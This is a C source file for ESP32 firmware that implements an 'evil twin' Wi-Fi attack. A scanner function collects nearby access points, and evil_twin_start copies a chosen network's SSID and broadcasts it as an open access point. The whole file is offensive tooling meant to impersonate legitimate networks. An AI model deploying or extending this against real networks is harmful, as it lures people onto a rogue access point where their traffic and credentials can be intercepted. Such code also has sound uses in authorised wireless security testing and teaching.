#include <string.h>
#include <stdio.h>
#include "sdkconfig.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "esp_system.h"
#include "esp_event.h"
#include "esp_err.h"
#include "esp_netif.h"
#include "nvs_flash.h"
#include "esp_wifi.h"
#include "esp_log.h"
#include <esp_wifi_types.h>
#include "esp_ui.h"
#include "evil-twin.h"

char * TAG = "debug";
char * AP_TAG = "AP";

Scan ap_scan;
bool evilTwinOn = false;
esp_netif_t *nifx;

void scanner()
{	
    
	wifi_config_t wifi_sta_cfg = {
		.sta = {
			.scan_method = WIFI_ALL_CHANNEL_SCAN
		}
	};
	ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_STA, &wifi_sta_cfg));
	ESP_ERROR_CHECK(esp_wifi_start());
	
    wifi_scan_config_t scan_cfg = {
      .ssid = NULL,
      .bssid = NULL,
      .channel = 0,
      .show_hidden = false
    };
    ESP_ERROR_CHECK(esp_wifi_scan_start(&scan_cfg, true));
    ESP_ERROR_CHECK(esp_wifi_scan_stop());

    uint16_t num_ap;
    ESP_ERROR_CHECK(esp_wifi_scan_get_ap_num(&num_ap));
    ESP_LOGI(AP_TAG, "%u APs found", num_ap);
	
	
	if (num_ap != 0){ //prevents invalid args error
	   	wifi_ap_record_t *ap_records = calloc(num_ap, sizeof(*ap_records));
    	ESP_ERROR_CHECK(esp_wifi_scan_get_ap_records(&num_ap, ap_records));

    	ap_scan.ap_records = ap_records;
    	ap_scan.num_ap = num_ap;
	}
    ESP_ERROR_CHECK(esp_wifi_stop()); 
	vTaskDelete(NULL);

};

void evil_twin_start(void * void_clone_ap_record)
{
	runningTasks++;
	if (void_clone_ap_record == NULL){
		ESP_LOGI(AP_TAG, "INVALID ARGS passed in evil_twin_start, deleting task...");
		vTaskDelete(NULL);
	}
	evilTwinOn = true;
	wifi_ap_record_t *clone_ap_record = (wifi_ap_record_t*)void_clone_ap_record;

	
	wifi_config_t wifi_ap_cfg = {
		.ap = {
			.ssid_len = strlen((char*)clone_ap_record->ssid),
			.channel = 1,
			.authmode = WIFI_AUTH_OPEN,
			.ssid_hidden = 0,
			.max_connection = 10,
			.beacon_interval = 100
		}
	};
	strcpy((char*)wifi_ap_cfg.ap.ssid, (char*)clone_ap_record->ssid);
		
	esp_wifi_set_config(WIFI_IF_AP, &wifi_ap_cfg );
    ESP_ERROR_CHECK(esp_wifi_start());

    ESP_LOGI(AP_TAG, "Broadcasting with %s...", (char*)wifi_ap_cfg.ap.ssid );
	vTaskDelete(NULL);

}

void evil_twin_stop(){
	runningTasks -= 1;
	evilTwinOn = false;
	ESP_ERROR_CHECK(esp_wifi_stop()); 
	esp_netif_destroy_default_wifi(nifx);
	ESP_LOGI(AP_TAG, "evil twin stop");
	vTaskDelete(NULL);
}

